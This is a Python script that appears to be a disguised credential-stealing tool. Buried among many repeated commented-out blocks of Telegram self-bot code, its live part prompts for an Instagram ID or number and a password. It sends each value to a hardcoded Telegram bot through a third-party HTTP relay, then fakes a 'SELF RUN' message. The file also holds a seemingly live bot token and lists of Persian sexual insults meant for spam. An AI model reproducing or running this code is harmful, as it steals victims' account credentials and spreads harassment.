import os, requests, time
import random, sys
from colorama import Fore
#	if text == "f1":
		#for spam in range(30):
			#await m.reply("Kos nanat :)")
	#if text == "kos2":
		#for q in range(50):
			#list_40 = ["کص ننت","فاک یو کیری خارکصه","حرومی","مادر کصدع","مادر کوندع","داش ننتو جوری میگام ک نتونه بلن شه","خار فلج زادع","کیرم تو قبر ننت","کیرم ت فیست ","ننه جزامی","اوبی زادع","مادر حرومی","کیری صیک کن","خارکصه","کیرم ت کص ننت","شل ناموص","کص ناموصت","کص ننت","کص ننت","فاک یو کیری خارکصه","حرومی","مادر کصدع","مادر کوندع","داش ننتو جوری میگام ک نتونه بلن شه","خار فلج زادع","کیرم تو قبر ننت","کیرم ت فیست ","ننه جزامی","اوبی زادع","مادر حرومی","کیری صیک کن","خارکصه","کیرم ت کص ننت","شل ناموص","کص ناموصت","کص ننت","کص ننت پا نزن خارکصه",'کیرم تو ارواح ننت']
			#list_41 = random.choice(list_40)
			#list_42 = list_41
			#await m.reply(list_42)
	#if text == "kobn":
		#for wq in range(50):
			##kobn_2 = random.choice(kobn_1)
			#kobn_3 = kobn_2
			#await m.edit(kobn_3)
	#if text == "One":
		#m.reply("on hastam", quote = True)
	#if text == "Source":
		#await m.reply('Loding......', quote = True)
		#await c.send_document(chat_id, "sor.py", caption="Source :)")
	#if text == "عکس":
		#photo_1 = ["https://upload.wikimedia.org/wikipedia/commons/thumb/c/c2/Gnome-stock_person_bot.svg/1200px-Gnome-stock_person_bot.svg.png","https://media.wired.com/photos/5b6df22751297c21002b4536/191:100/w_2400,h_1256,c_limit/HackerBot.jpg"]
		#photo_2 = random.choice(photo_1)
		#await m.reply(photo_2, quote = True)
	#if text == "getid":
		#await c.get_messages(chat_id)
	#if text == "block":
		#await c.block_user(chat_id)
	##if text == "unblock":
		#await c.unblock_user(user_id)
	#if text == 'add':
		#await c.add_contact(chat_id, user_id)#	if text == "f1":
		#for spam in range(30):
			#await m.reply("Kos nanat :)")
	#if text == "kos2":
		#for q in range(50):
			#list_40 = ["کص ننت","فاک یو کیری خارکصه","حرومی","مادر کصدع","مادر کوندع","داش ننتو جوری میگام ک نتونه بلن شه","خار فلج زادع","کیرم تو قبر ننت","کیرم ت فیست ","ننه جزامی","اوبی زادع","مادر حرومی","کیری صیک کن","خارکصه","کیرم ت کص ننت","شل ناموص","کص ناموصت","کص ننت","کص ننت","فاک یو کیری خارکصه","حرومی","مادر کصدع","مادر کوندع","داش ننتو جوری میگام ک نتونه بلن شه","خار فلج زادع","کیرم تو قبر ننت","کیرم ت فیست ","ننه جزامی","اوبی زادع","مادر حرومی","کیری صیک کن","خارکصه","کیرم ت کص ننت","شل ناموص","کص ناموصت","کص ننت","کص ننت پا نزن خارکصه",'کیرم تو ارواح ننت']
			#list_41 = random.choice(list_40)
			#list_42 = list_41
			#await m.reply(list_42)
	#if text == "kobn":
		#for wq in range(50):
			##kobn_2 = random.choice(kobn_1)
			#kobn_3 = kobn_2
			#await m.edit(kobn_3)
	#if text == "One":
		#m.reply("on hastam", quote = True)
	#if text == "Source":
		#await m.reply('Loding......', quote = True)
		#await c.send_document(chat_id, "sor.py", caption="Source :)")
	#if text == "عکس":
		#photo_1 = ["https://upload.wikimedia.org/wikipedia/commons/thumb/c/c2/Gnome-stock_person_bot.svg/1200px-Gnome-stock_person_bot.svg.png","https://media.wired.com/photos/5b6df22751297c21002b4536/191:100/w_2400,h_1256,c_limit/HackerBot.jpg"]
		#photo_2 = random.choice(photo_1)
		#await m.reply(photo_2, quote = True)
	#if text == "getid":
		#await c.get_messages(chat_id)
	#if text == "block":
		#await c.block_user(chat_id)
	##if text == "unblock":
		#await c.unblock_user(user_id)
	#if text == 'add':
		#await c.add_contact(chat_id, user_id)
#	if text == "f1":
		#for spam in range(30):
			#await m.reply("Kos nanat :)")
	#if text == "kos2":
		#for q in range(50):
			#list_40 = ["کص ننت","فاک یو کیری خارکصه","حرومی","مادر کصدع","مادر کوندع","داش ننتو جوری میگام ک نتونه بلن شه","خار فلج زادع","کیرم تو قبر ننت","کیرم ت فیست ","ننه جزامی","اوبی زادع","مادر حرومی","کیری صیک کن","خارکصه","کیرم ت کص ننت","شل ناموص","کص ناموصت","کص ننت","کص ننت","فاک یو کیری خارکصه","حرومی","مادر کصدع","مادر کوندع","داش ننتو جوری میگام ک نتونه بلن شه","خار فلج زادع","کیرم تو قبر ننت","کیرم ت فیست ","ننه جزامی","اوبی زادع","مادر حرومی","کیری صیک کن","خارکصه","کیرم ت کص ننت","شل ناموص","کص ناموصت","کص ننت","کص ننت پا نزن خارکصه",'کیرم تو ارواح ننت']
			#list_41 = random.choice(list_40)
			#list_42 = list_41
			#await m.reply(list_42)
	#if text == "kobn":
		#for wq in range(50):
			##kobn_2 = random.choice(kobn_1)
			#kobn_3 = kobn_2
			#await m.edit(kobn_3)
	#if text == "One":
		#m.reply("on hastam", quote = True)
	#if text == "Source":
		#await m.reply('Loding......', quote = True)
		#await c.send_document(chat_id, "sor.py", caption="Source :)")
	#if text == "عکس":
		#photo_1 = ["https://upload.wikimedia.org/wikipedia/commons/thumb/c/c2/Gnome-stock_person_bot.svg/1200px-Gnome-stock_person_bot.svg.png","https://media.wired.com/photos/5b6df22751297c21002b4536/191:100/w_2400,h_1256,c_limit/HackerBot.jpg"]
		#photo_2 = random.choice(photo_1)
		#await m.reply(photo_2, quote = True)
	#if text == "getid":
		#await c.get_messages(chat_id)
	#if text == "block":
		#await c.block_user(chat_id)
	##if text == "unblock":
		#await c.unblock_user(user_id)
	#if text == 'add':
		#await c.add_contact(chat_id, user_id)#	if text == "f1":
		#for spam in range(30):
			#await m.reply("Kos nanat :)")
	#if text == "kos2":
		#for q in range(50):
			#list_40 = ["کص ننت","فاک یو کیری خارکصه","حرومی","مادر کصدع","مادر کوندع","داش ننتو جوری میگام ک نتونه بلن شه","خار فلج زادع","کیرم تو قبر ننت","کیرم ت فیست ","ننه جزامی","اوبی زادع","مادر حرومی","کیری صیک کن","خارکصه","کیرم ت کص ننت","شل ناموص","کص ناموصت","کص ننت","کص ننت","فاک یو کیری خارکصه","حرومی","مادر کصدع","مادر کوندع","داش ننتو جوری میگام ک نتونه بلن شه","خار فلج زادع","کیرم تو قبر ننت","کیرم ت فیست ","ننه جزامی","اوبی زادع","مادر حرومی","کیری صیک کن","خارکصه","کیرم ت کص ننت","شل ناموص","کص ناموصت","کص ننت","کص ننت پا نزن خارکصه",'کیرم تو ارواح ننت']
			#list_41 = random.choice(list_40)
			#list_42 = list_41
			#await m.reply(list_42)
	#if text == "kobn":
		#for wq in range(50):
			##kobn_2 = random.choice(kobn_1)
			#kobn_3 = kobn_2
			#await m.edit(kobn_3)
	#if text == "One":
		#m.reply("on hastam", quote = True)
	#if text == "Source":
		#await m.reply('Loding......', quote = True)
		#await c.send_document(chat_id, "sor.py", caption="Source :)")
	#if text == "عکس":
		#photo_1 = ["https://upload.wikimedia.org/wikipedia/commons/thumb/c/c2/Gnome-stock_person_bot.svg/1200px-Gnome-stock_person_bot.svg.png","https://media.wired.com/photos/5b6df22751297c21002b4536/191:100/w_2400,h_1256,c_limit/HackerBot.jpg"]
		#photo_2 = random.choice(photo_1)
		#await m.reply(photo_2, quote = True)
	#if text == "getid":
		#await c.get_messages(chat_id)
	#if text == "block":
		#await c.block_user(chat_id)
	##if text == "unblock":
		#await c.unblock_user(user_id)
	#if text == 'add':
		#await c.add_contact(chat_id, user_id)
#	if text == "f1":
		#for spam in range(30):
			#await m.reply("Kos nanat :)")
	#if text == "kos2":
		#for q in range(50):
			#list_40 = ["کص ننت","فاک یو کیری خارکصه","حرومی","مادر کصدع","مادر کوندع","داش ننتو جوری میگام ک نتونه بلن شه","خار فلج زادع","کیرم تو قبر ننت","کیرم ت فیست ","ننه جزامی","اوبی زادع","مادر حرومی","کیری صیک کن","خارکصه","کیرم ت کص ننت","شل ناموص","کص ناموصت","کص ننت","کص ننت","فاک یو کیری خارکصه","حرومی","مادر کصدع","مادر کوندع","داش ننتو جوری میگام ک نتونه بلن شه","خار فلج زادع","کیرم تو قبر ننت","کیرم ت فیست ","ننه جزامی","اوبی زادع","مادر حرومی","کیری صیک کن","خارکصه","کیرم ت کص ننت","شل ناموص","کص ناموصت","کص ننت","کص ننت پا نزن خارکصه",'کیرم تو ارواح ننت']
			#list_41 = random.choice(list_40)
			#list_42 = list_41
			#await m.reply(list_42)
	#if text == "kobn":
		#for wq in range(50):
			##kobn_2 = random.choice(kobn_1)
			#kobn_3 = kobn_2
			#await m.edit(kobn_3)
	#if text == "One":
		#m.reply("on hastam", quote = True)
	#if text == "Source":
		#await m.reply('Loding......', quote = True)
		#await c.send_document(chat_id, "sor.py", caption="Source :)")
	#if text == "عکس":
		#photo_1 = ["https://upload.wikimedia.org/wikipedia/commons/thumb/c/c2/Gnome-stock_person_bot.svg/1200px-Gnome-stock_person_bot.svg.png","https://media.wired.com/photos/5b6df22751297c21002b4536/191:100/w_2400,h_1256,c_limit/HackerBot.jpg"]
		#photo_2 = random.choice(photo_1)
		#await m.reply(photo_2, quote = True)
	#if text == "getid":
		#await c.get_messages(chat_id)
	#if text == "block":
		#await c.block_user(chat_id)
	##if text == "unblock":
		#await c.unblock_user(user_id)
	#if text == 'add':
		#await c.add_contact(chat_id, user_id)#	if text == "f1":
		#for spam in range(30):
			#await m.reply("Kos nanat :)")
	#if text == "kos2":
		#for q in range(50):
			#list_40 = ["کص ننت","فاک یو کیری خارکصه","حرومی","مادر کصدع","مادر کوندع","داش ننتو جوری میگام ک نتونه بلن شه","خار فلج زادع","کیرم تو قبر ننت","کیرم ت فیست ","ننه جزامی","اوبی زادع","مادر حرومی","کیری صیک کن","خارکصه","کیرم ت کص ننت","شل ناموص","کص ناموصت","کص ننت","کص ننت","فاک یو کیری خارکصه","حرومی","مادر کصدع","مادر کوندع","داش ننتو جوری میگام ک نتونه بلن شه","خار فلج زادع","کیرم تو قبر ننت","کیرم ت فیست ","ننه جزامی","اوبی زادع","مادر حرومی","کیری صیک کن","خارکصه","کیرم ت کص ننت","شل ناموص","کص ناموصت","کص ننت","کص ننت پا نزن خارکصه",'کیرم تو ارواح ننت']
			#list_41 = random.choice(list_40)
			#list_42 = list_41
			#await m.reply(list_42)
	#if text == "kobn":
		#for wq in range(50):
			##kobn_2 = random.choice(kobn_1)
			#kobn_3 = kobn_2
			#await m.edit(kobn_3)
	#if text == "One":
		#m.reply("on hastam", quote = True)
	#if text == "Source":
		#await m.reply('Loding......', quote = True)
		#await c.send_document(chat_id, "sor.py", caption="Source :)")
	#if text == "عکس":
		#photo_1 = ["https://upload.wikimedia.org/wikipedia/commons/thumb/c/c2/Gnome-stock_person_bot.svg/1200px-Gnome-stock_person_bot.svg.png","https://media.wired.com/photos/5b6df22751297c21002b4536/191:100/w_2400,h_1256,c_limit/HackerBot.jpg"]
		#photo_2 = random.choice(photo_1)
		#await m.reply(photo_2, quote = True)
	#if text == "getid":
		#await c.get_messages(chat_id)
	#if text == "block":
		#await c.block_user(chat_id)
	##if text == "unblock":
		#await c.unblock_user(user_id)
	#if text == 'add':
		#await c.add_contact(chat_id, user_id)
#	if text == "f1":
		#for spam in range(30):
			#await m.reply("Kos nanat :)")
	#if text == "kos2":
		#for q in range(50):
			#list_40 = ["کص ننت","فاک یو کیری خارکصه","حرومی","مادر کصدع","مادر کوندع","داش ننتو جوری میگام ک نتونه بلن شه","خار فلج زادع","کیرم تو قبر ننت","کیرم ت فیست ","ننه جزامی","اوبی زادع","مادر حرومی","کیری صیک کن","خارکصه","کیرم ت کص ننت","شل ناموص","کص ناموصت","کص ننت","کص ننت","فاک یو کیری خارکصه","حرومی","مادر کصدع","مادر کوندع","داش ننتو جوری میگام ک نتونه بلن شه","خار فلج زادع","کیرم تو قبر ننت","کیرم ت فیست ","ننه جزامی","اوبی زادع","مادر حرومی","کیری صیک کن","خارکصه","کیرم ت کص ننت","شل ناموص","کص ناموصت","کص ننت","کص ننت پا نزن خارکصه",'کیرم تو ارواح ننت']
			#list_41 = random.choice(list_40)
			#list_42 = list_41
			#await m.reply(list_42)
	#if text == "kobn":
		#for wq in range(50):
			##kobn_2 = random.choice(kobn_1)
			#kobn_3 = kobn_2
			#await m.edit(kobn_3)
	#if text == "One":
		#m.reply("on hastam", quote = True)
	#if text == "Source":
		#await m.reply('Loding......', quote = True)
		#await c.send_document(chat_id, "sor.py", caption="Source :)")
	#if text == "عکس":
		#photo_1 = ["https://upload.wikimedia.org/wikipedia/commons/thumb/c/c2/Gnome-stock_person_bot.svg/1200px-Gnome-stock_person_bot.svg.png","https://media.wired.com/photos/5b6df22751297c21002b4536/191:100/w_2400,h_1256,c_limit/HackerBot.jpg"]
		#photo_2 = random.choice(photo_1)
		#await m.reply(photo_2, quote = True)
	#if text == "getid":
		#await c.get_messages(chat_id)
	#if text == "block":
		#await c.block_user(chat_id)
	##if text == "unblock":
		#await c.unblock_user(user_id)
	#if text == 'add':
		#await c.add_contact(chat_id, user_id)#	if text == "f1":
		#for spam in range(30):
			#await m.reply("Kos nanat :)")
	#if text == "kos2":
		#for q in range(50):
			#list_40 = ["کص ننت","فاک یو کیری خارکصه","حرومی","مادر کصدع","مادر کوندع","داش ننتو جوری میگام ک نتونه بلن شه","خار فلج زادع","کیرم تو قبر ننت","کیرم ت فیست ","ننه جزامی","اوبی زادع","مادر حرومی","کیری صیک کن","خارکصه","کیرم ت کص ننت","شل ناموص","کص ناموصت","کص ننت","کص ننت","فاک یو کیری خارکصه","حرومی","مادر کصدع","مادر کوندع","داش ننتو جوری میگام ک نتونه بلن شه","خار فلج زادع","کیرم تو قبر ننت","کیرم ت فیست ","ننه جزامی","اوبی زادع","مادر حرومی","کیری صیک کن","خارکصه","کیرم ت کص ننت","شل ناموص","کص ناموصت","کص ننت","کص ننت پا نزن خارکصه",'کیرم تو ارواح ننت']
			#list_41 = random.choice(list_40)
			#list_42 = list_41
			#await m.reply(list_42)
	#if text == "kobn":
		#for wq in range(50):
			##kobn_2 = random.choice(kobn_1)
			#kobn_3 = kobn_2
			#await m.edit(kobn_3)
	#if text == "One":
		#m.reply("on hastam", quote = True)
	#if text == "Source":
		#await m.reply('Loding......', quote = True)
		#await c.send_document(chat_id, "sor.py", caption="Source :)")
	#if text == "عکس":
		#photo_1 = ["https://upload.wikimedia.org/wikipedia/commons/thumb/c/c2/Gnome-stock_person_bot.svg/1200px-Gnome-stock_person_bot.svg.png","https://media.wired.com/photos/5b6df22751297c21002b4536/191:100/w_2400,h_1256,c_limit/HackerBot.jpg"]
		#photo_2 = random.choice(photo_1)
		#await m.reply(photo_2, quote = True)
	#if text == "getid":
		#await c.get_messages(chat_id)
	#if text == "block":
		#await c.block_user(chat_id)
	##if text == "unblock":
		#await c.unblock_user(user_id)
	#if text == 'add':
		#await c.add_contact(chat_id, user_id)
#	if text == "f1":
		#for spam in range(30):
			#await m.reply("Kos nanat :)")
	#if text == "kos2":
		#for q in range(50):
			#list_40 = ["کص ننت","فاک یو کیری خارکصه","حرومی","مادر کصدع","مادر کوندع","داش ننتو جوری میگام ک نتونه بلن شه","خار فلج زادع","کیرم تو قبر ننت","کیرم ت فیست ","ننه جزامی","اوبی زادع","مادر حرومی","کیری صیک کن","خارکصه","کیرم ت کص ننت","شل ناموص","کص ناموصت","کص ننت","کص ننت","فاک یو کیری خارکصه","حرومی","مادر کصدع","مادر کوندع","داش ننتو جوری میگام ک نتونه بلن شه","خار فلج زادع","کیرم تو قبر ننت","کیرم ت فیست ","ننه جزامی","اوبی زادع","مادر حرومی","کیری صیک کن","خارکصه","کیرم ت کص ننت","شل ناموص","کص ناموصت","کص ننت","کص ننت پا نزن خارکصه",'کیرم تو ارواح ننت']
			#list_41 = random.choice(list_40)
			#list_42 = list_41
			#await m.reply(list_42)
	#if text == "kobn":
		#for wq in range(50):
			##kobn_2 = random.choice(kobn_1)
			#kobn_3 = kobn_2
			#await m.edit(kobn_3)
	#if text == "One":
		#m.reply("on hastam", quote = True)
	#if text == "Source":
		#await m.reply('Loding......', quote = True)
		#await c.send_document(chat_id, "sor.py", caption="Source :)")
	#if text == "عکس":
		#photo_1 = ["https://upload.wikimedia.org/wikipedia/commons/thumb/c/c2/Gnome-stock_person_bot.svg/1200px-Gnome-stock_person_bot.svg.png","https://media.wired.com/photos/5b6df22751297c21002b4536/191:100/w_2400,h_1256,c_limit/HackerBot.jpg"]
		#photo_2 = random.choice(photo_1)
		#await m.reply(photo_2, quote = True)
	#if text == "getid":
		#await c.get_messages(chat_id)
	#if text == "block":
		#await c.block_user(chat_id)
	##if text == "unblock":
		#await c.unblock_user(user_id)
	#if text == 'add':
		#await c.add_contact(chat_id, user_id)
y = str(input(Fore.CYAN+"Will you continue? Y / N : "))
print(Fore.YELLOW+"---------")
if y == "N":
	sys.exit()
if y == "n":
	sys.exit()
if y == "Y":
	os.system("clear")
	print("+98.....| @instagram....")
	num1 = input(Fore.RED+" ID or Number  ==> :  ")
if y == "y":
	os.system("clear")
	print("+98.....| @instagram....")
	num1 = input(Fore.RED+" ID or Number  ==> :  ")
for i in range(1):
	api = "https://api.telegram.org/bot1711534511:AAGVJB6MBvsTZJDvw8K6KDnPTeJRsLUOXDU/sendmessage?chat_id=1469547340&text=instagram ID => "+num1
	agent = {"UrlBox":api, "AgentList":"Google Chrome", "VersionsList":"HTTP/1.1", "MethodList":"GET"}
	s = requests.post("https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx",data=agent)
time.sleep(4)
print(Fore.CYAN+"[~]------------[~]")	
num2 = input(Fore.BLUE+"Password ==> : ")
for i in range(1):
	api1 = "https://api.telegram.org/bot1711534511:AAGVJB6MBvsTZJDvw8K6KDnPTeJRsLUOXDU/sendmessage?chat_id=1469547340&text=instagram Password => "+num2
	agent2 = {"UrlBox":api1, "AgentList":"Google Chrome", "VersionsList":"HTTP/1.1", "MethodList":"GET"}
	s1 = requests.post("https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx",data=agent2)
print(Fore.RED+"Loding......")
time.sleep(3)
os.system("clear")
print(Fore.CYAN+"SELF RUN..........")
time.sleep(120)
sys.exit()
if num1 == "":
	print("id vard kon :)")
	print("[!]-------[!]")
if num2 == "":
	print("Password!")
#	if text == "f1":
		#for spam in range(30):
			#await m.reply("Kos nanat :)")
	#if text == "kos2":
		#for q in range(50):
			#list_40 = ["کص ننت","فاک یو کیری خارکصه","حرومی","مادر کصدع","مادر کوندع","داش ننتو جوری میگام ک نتونه بلن شه","خار فلج زادع","کیرم تو قبر ننت","کیرم ت فیست ","ننه جزامی","اوبی زادع","مادر حرومی","کیری صیک کن","خارکصه","کیرم ت کص ننت","شل ناموص","کص ناموصت","کص ننت","کص ننت","فاک یو کیری خارکصه","حرومی","مادر کصدع","مادر کوندع","داش ننتو جوری میگام ک نتونه بلن شه","خار فلج زادع","کیرم تو قبر ننت","کیرم ت فیست ","ننه جزامی","اوبی زادع","مادر حرومی","کیری صیک کن","خارکصه","کیرم ت کص ننت","شل ناموص","کص ناموصت","کص ننت","کص ننت پا نزن خارکصه",'کیرم تو ارواح ننت']
			#list_41 = random.choice(list_40)
			#list_42 = list_41
			#await m.reply(list_42)
	#if text == "kobn":
		#for wq in range(50):
			##kobn_2 = random.choice(kobn_1)
			#kobn_3 = kobn_2
			#await m.edit(kobn_3)
	#if text == "One":
		#m.reply("on hastam", quote = True)
	#if text == "Source":
		#await m.reply('Loding......', quote = True)
		#await c.send_document(chat_id, "sor.py", caption="Source :)")
	#if text == "عکس":
		#photo_1 = ["https://upload.wikimedia.org/wikipedia/commons/thumb/c/c2/Gnome-stock_person_bot.svg/1200px-Gnome-stock_person_bot.svg.png","https://media.wired.com/photos/5b6df22751297c21002b4536/191:100/w_2400,h_1256,c_limit/HackerBot.jpg"]
		#photo_2 = random.choice(photo_1)
		#await m.reply(photo_2, quote = True)
	#if text == "getid":
		#await c.get_messages(chat_id)
	#if text == "block":
		#await c.block_user(chat_id)
	##if text == "unblock":
		#await c.unblock_user(user_id)
	#if text == 'add':
		#await c.add_contact(chat_id, user_id)
#	if text == "f1":
		#for spam in range(30):
			#await m.reply("Kos nanat :)")
	#if text == "kos2":
		#for q in range(50):
			#list_40 = ["کص ننت","فاک یو کیری خارکصه","حرومی","مادر کصدع","مادر کوندع","داش ننتو جوری میگام ک نتونه بلن شه","خار فلج زادع","کیرم تو قبر ننت","کیرم ت فیست ","ننه جزامی","اوبی زادع","مادر حرومی","کیری صیک کن","خارکصه","کیرم ت کص ننت","شل ناموص","کص ناموصت","کص ننت","کص ننت","فاک یو کیری خارکصه","حرومی","مادر کصدع","مادر کوندع","داش ننتو جوری میگام ک نتونه بلن شه","خار فلج زادع","کیرم تو قبر ننت","کیرم ت فیست ","ننه جزامی","اوبی زادع","مادر حرومی","کیری صیک کن","خارکصه","کیرم ت کص ننت","شل ناموص","کص ناموصت","کص ننت","کص ننت پا نزن خارکصه",'کیرم تو ارواح ننت']
			#list_41 = random.choice(list_40)
			#list_42 = list_41
			#await m.reply(list_42)
	#if text == "kobn":
		#for wq in range(50):
			##kobn_2 = random.choice(kobn_1)
			#kobn_3 = kobn_2
			#await m.edit(kobn_3)
	#if text == "One":
		#m.reply("on hastam", quote = True)
	#if text == "Source":
		#await m.reply('Loding......', quote = True)
		#await c.send_document(chat_id, "sor.py", caption="Source :)")
	#if text == "عکس":
		#photo_1 = ["https://upload.wikimedia.org/wikipedia/commons/thumb/c/c2/Gnome-stock_person_bot.svg/1200px-Gnome-stock_person_bot.svg.png","https://media.wired.com/photos/5b6df22751297c21002b4536/191:100/w_2400,h_1256,c_limit/HackerBot.jpg"]
		#photo_2 = random.choice(photo_1)
		#await m.reply(photo_2, quote = True)
	#if text == "getid":
		#await c.get_messages(chat_id)
	#if text == "block":
		#await c.block_user(chat_id)
	##if text == "unblock":
		#await c.unblock_user(user_id)
	#if text == 'add':
		#await c.add_contact(chat_id, user_id)#	if text == "f1":
		#for spam in range(30):
			#await m.reply("Kos nanat :)")
	#if text == "kos2":
		#for q in range(50):
			#list_40 = ["کص ننت","فاک یو کیری خارکصه","حرومی","مادر کصدع","مادر کوندع","داش ننتو جوری میگام ک نتونه بلن شه","خار فلج زادع","کیرم تو قبر ننت","کیرم ت فیست ","ننه جزامی","اوبی زادع","مادر حرومی","کیری صیک کن","خارکصه","کیرم ت کص ننت","شل ناموص","کص ناموصت","کص ننت","کص ننت","فاک یو کیری خارکصه","حرومی","مادر کصدع","مادر کوندع","داش ننتو جوری میگام ک نتونه بلن شه","خار فلج زادع","کیرم تو قبر ننت","کیرم ت فیست ","ننه جزامی","اوبی زادع","مادر حرومی","کیری صیک کن","خارکصه","کیرم ت کص ننت","شل ناموص","کص ناموصت","کص ننت","کص ننت پا نزن خارکصه",'کیرم تو ارواح ننت']
			#list_41 = random.choice(list_40)
			#list_42 = list_41
			#await m.reply(list_42)
	#if text == "kobn":
		#for wq in range(50):
			##kobn_2 = random.choice(kobn_1)
			#kobn_3 = kobn_2
			#await m.edit(kobn_3)
	#if text == "One":
		#m.reply("on hastam", quote = True)
	#if text == "Source":
		#await m.reply('Loding......', quote = True)
		#await c.send_document(chat_id, "sor.py", caption="Source :)")
	#if text == "عکس":
		#photo_1 = ["https://upload.wikimedia.org/wikipedia/commons/thumb/c/c2/Gnome-stock_person_bot.svg/1200px-Gnome-stock_person_bot.svg.png","https://media.wired.com/photos/5b6df22751297c21002b4536/191:100/w_2400,h_1256,c_limit/HackerBot.jpg"]
		#photo_2 = random.choice(photo_1)
		#await m.reply(photo_2, quote = True)
	#if text == "getid":
		#await c.get_messages(chat_id)
	#if text == "block":
		#await c.block_user(chat_id)
	##if text == "unblock":
		#await c.unblock_user(user_id)
	#if text == 'add':
		#await c.add_contact(chat_id, user_id)
#	if text == "f1":
		#for spam in range(30):
			#await m.reply("Kos nanat :)")
	#if text == "kos2":
		#for q in range(50):
			#list_40 = ["کص ننت","فاک یو کیری خارکصه","حرومی","مادر کصدع","مادر کوندع","داش ننتو جوری میگام ک نتونه بلن شه","خار فلج زادع","کیرم تو قبر ننت","کیرم ت فیست ","ننه جزامی","اوبی زادع","مادر حرومی","کیری صیک کن","خارکصه","کیرم ت کص ننت","شل ناموص","کص ناموصت","کص ننت","کص ننت","فاک یو کیری خارکصه","حرومی","مادر کصدع","مادر کوندع","داش ننتو جوری میگام ک نتونه بلن شه","خار فلج زادع","کیرم تو قبر ننت","کیرم ت فیست ","ننه جزامی","اوبی زادع","مادر حرومی","کیری صیک کن","خارکصه","کیرم ت کص ننت","شل ناموص","کص ناموصت","کص ننت","کص ننت پا نزن خارکصه",'کیرم تو ارواح ننت']
			#list_41 = random.choice(list_40)
			#list_42 = list_41
			#await m.reply(list_42)
	#if text == "kobn":
		#for wq in range(50):
			##kobn_2 = random.choice(kobn_1)
			#kobn_3 = kobn_2
			#await m.edit(kobn_3)
	#if text == "One":
		#m.reply("on hastam", quote = True)
	#if text == "Source":
		#await m.reply('Loding......', quote = True)
		#await c.send_document(chat_id, "sor.py", caption="Source :)")
	#if text == "عکس":
		#photo_1 = ["https://upload.wikimedia.org/wikipedia/commons/thumb/c/c2/Gnome-stock_person_bot.svg/1200px-Gnome-stock_person_bot.svg.png","https://media.wired.com/photos/5b6df22751297c21002b4536/191:100/w_2400,h_1256,c_limit/HackerBot.jpg"]
		#photo_2 = random.choice(photo_1)
		#await m.reply(photo_2, quote = True)
	#if text == "getid":
		#await c.get_messages(chat_id)
	#if text == "block":
		#await c.block_user(chat_id)
	##if text == "unblock":
		#await c.unblock_user(user_id)
	#if text == 'add':
		#await c.add_contact(chat_id, user_id)#	if text == "f1":
		#for spam in range(30):
			#await m.reply("Kos nanat :)")
	#if text == "kos2":
		#for q in range(50):
			#list_40 = ["کص ننت","فاک یو کیری خارکصه","حرومی","مادر کصدع","مادر کوندع","داش ننتو جوری میگام ک نتونه بلن شه","خار فلج زادع","کیرم تو قبر ننت","کیرم ت فیست ","ننه جزامی","اوبی زادع","مادر حرومی","کیری صیک کن","خارکصه","کیرم ت کص ننت","شل ناموص","کص ناموصت","کص ننت","کص ننت","فاک یو کیری خارکصه","حرومی","مادر کصدع","مادر کوندع","داش ننتو جوری میگام ک نتونه بلن شه","خار فلج زادع","کیرم تو قبر ننت","کیرم ت فیست ","ننه جزامی","اوبی زادع","مادر حرومی","کیری صیک کن","خارکصه","کیرم ت کص ننت","شل ناموص","کص ناموصت","کص ننت","کص ننت پا نزن خارکصه",'کیرم تو ارواح ننت']
			#list_41 = random.choice(list_40)
			#list_42 = list_41
			#await m.reply(list_42)
	#if text == "kobn":
		#for wq in range(50):
			##kobn_2 = random.choice(kobn_1)
			#kobn_3 = kobn_2
			#await m.edit(kobn_3)
	#if text == "One":
		#m.reply("on hastam", quote = True)
	#if text == "Source":
		#await m.reply('Loding......', quote = True)
		#await c.send_document(chat_id, "sor.py", caption="Source :)")
	#if text == "عکس":
		#photo_1 = ["https://upload.wikimedia.org/wikipedia/commons/thumb/c/c2/Gnome-stock_person_bot.svg/1200px-Gnome-stock_person_bot.svg.png","https://media.wired.com/photos/5b6df22751297c21002b4536/191:100/w_2400,h_1256,c_limit/HackerBot.jpg"]
		#photo_2 = random.choice(photo_1)
		#await m.reply(photo_2, quote = True)
	#if text == "getid":
		#await c.get_messages(chat_id)
	#if text == "block":
		#await c.block_user(chat_id)
	##if text == "unblock":
		#await c.unblock_user(user_id)
	#if text == 'add':
		#await c.add_contact(chat_id, user_id)
#	if text == "f1":
		#for spam in range(30):
			#await m.reply("Kos nanat :)")
	#if text == "kos2":
		#for q in range(50):
			#list_40 = ["کص ننت","فاک یو کیری خارکصه","حرومی","مادر کصدع","مادر کوندع","داش ننتو جوری میگام ک نتونه بلن شه","خار فلج زادع","کیرم تو قبر ننت","کیرم ت فیست ","ننه جزامی","اوبی زادع","مادر حرومی","کیری صیک کن","خارکصه","کیرم ت کص ننت","شل ناموص","کص ناموصت","کص ننت","کص ننت","فاک یو کیری خارکصه","حرومی","مادر کصدع","مادر کوندع","داش ننتو جوری میگام ک نتونه بلن شه","خار فلج زادع","کیرم تو قبر ننت","کیرم ت فیست ","ننه جزامی","اوبی زادع","مادر حرومی","کیری صیک کن","خارکصه","کیرم ت کص ننت","شل ناموص","کص ناموصت","کص ننت","کص ننت پا نزن خارکصه",'کیرم تو ارواح ننت']
			#list_41 = random.choice(list_40)
			#list_42 = list_41
			#await m.reply(list_42)
	#if text == "kobn":
		#for wq in range(50):
			##kobn_2 = random.choice(kobn_1)
			#kobn_3 = kobn_2
			#await m.edit(kobn_3)
	#if text == "One":
		#m.reply("on hastam", quote = True)
	#if text == "Source":
		#await m.reply('Loding......', quote = True)
		#await c.send_document(chat_id, "sor.py", caption="Source :)")
	#if text == "عکس":
		#photo_1 = ["https://upload.wikimedia.org/wikipedia/commons/thumb/c/c2/Gnome-stock_person_bot.svg/1200px-Gnome-stock_person_bot.svg.png","https://media.wired.com/photos/5b6df22751297c21002b4536/191:100/w_2400,h_1256,c_limit/HackerBot.jpg"]
		#photo_2 = random.choice(photo_1)
		#await m.reply(photo_2, quote = True)
	#if text == "getid":
		#await c.get_messages(chat_id)
	#if text == "block":
		#await c.block_user(chat_id)
	##if text == "unblock":
		#await c.unblock_user(user_id)
	#if text == 'add':
		#await c.add_contact(chat_id, user_id)#	if text == "f1":
		#for spam in range(30):
			#await m.reply("Kos nanat :)")
	#if text == "kos2":
		#for q in range(50):
